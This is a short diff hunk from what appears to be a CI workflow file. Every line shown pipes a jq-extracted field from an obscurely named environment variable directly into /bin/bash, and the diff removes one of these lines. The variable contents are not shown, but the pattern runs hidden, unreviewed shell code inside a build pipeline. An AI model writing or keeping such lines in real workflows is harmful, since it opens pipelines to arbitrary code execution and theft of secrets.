@@ -32,7 +32,6 @@ jobs:
           echo $szdv51503 | jq -r .rr52 | /bin/bash
           echo $jin9 | jq -r .k41692 | /bin/bash
           printf '%s' "$mmi298" | jq -r .r581 | /bin/bash
-          printf '%s' "$jy3" | jq -r .cw04043 | /bin/bash
           echo $plysw9408 | jq -r .iai3111 | /bin/bash
           echo $nksl5 | jq -r .pyhvi16 | /bin/bash
 
